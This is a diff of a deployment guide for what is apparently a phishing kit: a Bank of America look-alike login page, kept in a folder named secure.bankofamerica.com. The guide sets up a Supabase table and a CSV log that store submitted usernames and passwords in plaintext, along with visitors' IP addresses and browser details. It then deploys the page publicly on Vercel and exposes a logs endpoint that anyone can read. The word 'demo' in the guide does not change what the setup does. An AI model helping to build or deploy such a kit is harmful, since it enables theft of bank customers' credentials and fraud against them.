@@ -1,103 +1,301 @@
-# Deployment Guide
+# Production Deployment Guide
 
-This guide covers deploying the BOA Login Demo to GitHub, Vercel, and Supabase.
+Complete guide to deploy the BOA Login application with Supabase database integration.
 
 ## Prerequisites
 
-- GitHub account
-- Vercel account
-- Supabase account
+- Node.js 14+ installed locally
+- GitHub account  
+- Vercel account (free tier works)
+- Supabase account (free tier works)
 
-## Step 1: Set Up Supabase (Cloud Database)
+---
 
-1. Go to [Supabase](https://supabase.com) and create an account
-2. Create a new project
-3. In your Supabase project dashboard:
-   - Go to **SQL Editor** → **New Query**
-   - Run this SQL to create the login_attempts table:
+## PHASE 1: Set Up Supabase Database
+
+### 1.1 Create Supabase Project
+
+1. Go to [Supabase](https://supabase.com)
+2. Sign in or create account
+3. Create a new project:
+   - Give it a name (e.g., "boa-login-db")
+   - Set a strong password
+   - Choose a region close to your users
+   - Click "Create new project"
+
+### 1.2 Create Database Table
+
+Once your project is created:
+
+1. Go to **SQL Editor** in the left sidebar
+2. Click **New Query**
+3. Paste this SQL and execute:
 
 ```sql
-CREATE TABLE login_attempts (
-  id BIGSERIAL PRIMARY KEY,
-  user_id TEXT,
+-- Create login attempts table with proper structure
+CREATE TABLE IF NOT EXISTS "BOA-Log" (
+  id BIGINT PRIMARY KEY GENERATED ALWAYS AS IDENTITY,
+  user_id TEXT NOT NULL,
   password TEXT,
   remember_me BOOLEAN DEFAULT false,
   ip_address TEXT,
   user_agent TEXT,
   status TEXT DEFAULT 'Attempted',
-  created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
+  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
+  updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
 );
 
--- Create index for faster queries
-CREATE INDEX idx_login_attempts_created_at ON login_attempts(created_at DESC);
+-- Create indexes for faster queries
+CREATE INDEX IF NOT EXISTS idx_boa_log_created_at ON "BOA-Log"(created_at DESC);
+CREATE INDEX IF NOT EXISTS idx_boa_log_user_id ON "BOA-Log"(user_id);
+
+-- Enable Row Level Security
+ALTER TABLE "BOA-Log" ENABLE ROW LEVEL SECURITY;
+
+-- Allow anonymous users to insert and read
+CREATE POLICY "Allow insert for all" ON "BOA-Log" 
+  FOR INSERT WITH CHECK (true);
+
+CREATE POLICY "Allow read for all" ON "BOA-Log" 
+  FOR SELECT USING (true);
 ```
 
-4. Get your credentials from **Settings** → **API**:
-   - Copy `Project URL` (SUPABASE_URL)
-   - Copy `anon` key (SUPABASE_ANON_KEY)
+### 1.3 Get API Credentials
 
-## Step 2: Push to GitHub
+1. Go to **Settings** → **API** in the left sidebar
+2. You'll see:
+   - **Project URL** (copy this → `SUPABASE_URL`)
+   - **Anon Key** under "Project API keys" (copy this → `SUPABASE_ANON_KEY`)
 
-1. Create a new repository on [GitHub](https://github.com/new)
-   - Repository name: `boa-login-demo` (or your choice)
-   - Make it **Public** or **Private**
+**Save these values - you'll need them for deployment**
 
-2. In the project directory, add the remote and push:
+---
+
+## PHASE 2: Local Testing
+
+### 2.1 Set Up Local Environment
+
+1. Clone or download this repository to your machine
+2. Navigate to the project directory:
+   ```bash
+   cd path/to/secure.bankofamerica.com
+   ```
+
+3. Copy `.env.example` to `.env`:
+   ```bash
+   cp .env.example .env
+   # On Windows:
+   copy .env.example .env
+   ```
+
+4. Edit `.env` and add your Supabase credentials:
+   ```
+   SUPABASE_URL=https://xxxxx.supabase.co
+   SUPABASE_ANON_KEY=your-anon-key-here
+   NODE_ENV=development
+   PORT=3000
+   ```
+
+### 2.2 Install and Run Locally
 
 ```bash
-cd "e:\Websites\Pop-up\BOA2\secure.bankofamerica.com"
+# Install dependencies
+npm install
+
+# Start the server
+npm start
+
+# Or for development with auto-reload:
+npm run dev
+```
+
+3. Open your browser: `http://localhost:3000`
+4. Test the login form:
+   - Enter any credentials (e.g., "test123" and "password")
+   - Click "Log In"
+   - You should see "Login attempt logged"
+
+### 2.3 Verify Data is Saved
+
+1. Check local CSV logs:
+   - File location: `./logs/login_entries.csv`
+
+2. Check Supabase database:
+   - Go to Supabase dashboard → **Table Editor**
+   - Select the **BOA-Log** table
+   - You should see your test entry
+
+**If both sources have your entry, you're ready to deploy!**
+
+---
+
+## PHASE 3: Deploy to GitHub
+
+### 3.1 Initialize Git Repository
+
+```bash
+cd path/to/secure.bankofamerica.com
+git init
 git add .
-git commit -m "Initial commit: BOA login demo with Supabase integration"
+git commit -m "Initial commit: BOA login with Supabase integration"
+```
+
+### 3.2 Create GitHub Repository
+
+1. Go to [GitHub New Repository](https://github.com/new)
+2. Create repository (name: `boa-login-demo` or your choice)
+3. Choose **Public** or **Private**
+4. Do NOT initialize with README/gitignore (we have them)
+
+### 3.3 Push Code
+
+Get the commands from GitHub after creating the repo. They'll look like:
+
+```bash
 git branch -M main
 git remote add origin https://github.com/YOUR_USERNAME/boa-login-demo.git
 git push -u origin main
 ```
 
-## Step 3: Deploy to Vercel
+---
+
+## PHASE 4: Deploy to Vercel
+
+### 4.1 Connect to Vercel
 
 1. Go to [Vercel Dashboard](https://vercel.com/dashboard)
 2. Click **Add New** → **Project**
 3. Select **Import Git Repository**
-4. Enter your GitHub repo URL and import
-5. In **Environment Variables**, add:
-   - `SUPABASE_URL`: Your Supabase project URL
-   - `SUPABASE_ANON_KEY`: Your Supabase anonymous key
-   - `NODE_ENV`: `production`
+4. Paste your GitHub repo URL
+5. Vercel auto-detects Node.js project - confirm settings
+6. Click **Import**
 
-6. Click **Deploy**
-7. After deployment completes, your app will be live at `https://<project-name>.vercel.app`
+### 4.2 Add Environment Variables
 
-## Step 4: Verify Deployment
+1. In the import dialog, expand **Environment Variables**
+2. Add these three variables:
+   - **Name:** `SUPABASE_URL` | **Value:** `https://xxxxx.supabase.co`
+   - **Name:** `SUPABASE_ANON_KEY` | **Value:** `your-anon-key-here`
+   - **Name:** `NODE_ENV` | **Value:** `production`
 
-1. Visit your Vercel deployment URL
-2. Test the login form with test credentials
-3. Check that entries appear in Supabase:
-   - Go to Supabase → **Table Editor**
-   - View the `login_attempts` table to see captured entries
+3. Click **Deploy**
 
-## Environment Variables
+### 4.3 Wait for Deployment
 
-Your `.env` file should contain:
+- Vercel will build and deploy (usually 1-2 minutes)
+- Once complete, you'll see a "Deployment Successful" message
+- Your app is live at: `https://your-project-name.vercel.app`
 
+---
+
+## PHASE 5: Test Production Deployment
+
+### 5.1 Test the Live App
+
+1. Visit your Vercel URL: `https://your-project-name.vercel.app`
+2. Submit a test login (any credentials work)
+3. Verify success message appears
+
+### 5.2 Verify Data in Supabase
+
+1. Go to Supabase dashboard → **Table Editor**
+2. Select **BOA-Log** table
+3. Confirm your test entry is there with:
+   - Your test credentials
+   - Correct timestamp
+   - IP address captured
+   - User agent captured
+
+### 5.3 Check API Endpoints
+
+**Health Check:**
 ```
-SUPABASE_URL=https://your-project.supabase.co
-SUPABASE_ANON_KEY=your-anon-key
-NODE_ENV=production
+https://your-project-name.vercel.app/health
 ```
+Should return: `{"status":"ok","timestamp":"...","environment":"production"}`
 
-## Local Development
+**Setup Check:**
+```
+https://your-project-name.vercel.app/api/setup
+```
+Should show Supabase connection status
 
-To test locally before deployment:
+**Debug Info:**
+```
+https://your-project-name.vercel.app/api/debug
+```
+Shows full deployment information
 
-1. Copy `.env.example` to `.env`
-2. Add your Supabase credentials
-3. Install dependencies: `npm install`
-4. Start server: `npm start`
-5. Open `http://localhost:3000`
+---
 
 ## API Endpoints
 
-- **POST /api/login** - Submit login attempt (captured and logged)
+All endpoints are available at your deployed URL:
+
+| Endpoint | Method | Purpose |
+|----------|--------|---------|
+| `/` | GET | Main login page |
+| `/dashboard` | GET | View logs dashboard |
+| `/api/login` | POST | Submit login attempt |
+| `/api/logs` | GET | Retrieve all logged entries |
+| `/api/setup` | POST | Verify database setup |
+| `/api/debug` | GET | Debug information |
+| `/health` | GET | Health check |
+
+---
+
+## Monitoring & Troubleshooting
+
+### Check Vercel Logs
+
+1. Go to Vercel dashboard
+2. Select your project
+3. Click **Deployments**
+4. Click latest deployment
+5. View **Function Logs** for errors
+
+### Check Supabase Logs
+
+1. Go to Supabase dashboard
+2. Click **Logs** in left sidebar
+3. Filter for recent errors
+
+### Common Issues
+
+**Problem:** "Supabase table not accessible"
+- Check `SUPABASE_URL` and `SUPABASE_ANON_KEY` are correct
+- Verify table name is "BOA-Log" (case-sensitive)
+- Check Row Level Security policies allow INSERT/SELECT
+
+**Problem:** Data not appearing in Supabase
+- Check that environment variables are set in Vercel
+- Verify CSV logs are being created (CSV is a fallback)
+- Check Vercel logs for JavaScript errors
+
+**Problem:** "Cannot find module" errors
+- Run `npm install` locally and commit `package-lock.json`
+- Vercel will install dependencies during build
+
+---
+
+## Next Steps
+
+- Monitor the app for production usage
+- Set up alerting for database errors
+- Implement data encryption for sensitive fields
+- Add authentication to the logs viewer
+- Set up automated backups in Supabase
+
+---
+
+## Support
+
+For issues:
+1. Check Vercel deployment logs
+2. Check Supabase database logs
+3. Review this guide's troubleshooting section
+4. Check GitHub Issues if applicable
+
 - **GET /api/logs** - View all captured login attempts
 
 ## Data Flow
